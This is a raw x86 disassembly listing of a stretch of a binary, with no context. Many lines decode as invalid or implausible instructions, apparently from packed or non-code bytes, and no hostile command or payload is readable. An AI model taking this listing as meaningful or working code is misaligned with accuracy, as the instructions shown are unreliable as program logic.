  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
  4113d9:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4113df:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4113e9:	cmp    al,0xff
  4113eb:	pushf  
  4113ec:	mov    edi,edi
  4113ee:	or     BYTE PTR [esi+ecx*1],cl
  4113f1:	jne    0x4113b6
  4113f3:	call   0xa13bf
  4113f8:	adc    BYTE PTR [ebp+eax*2+0xc],al
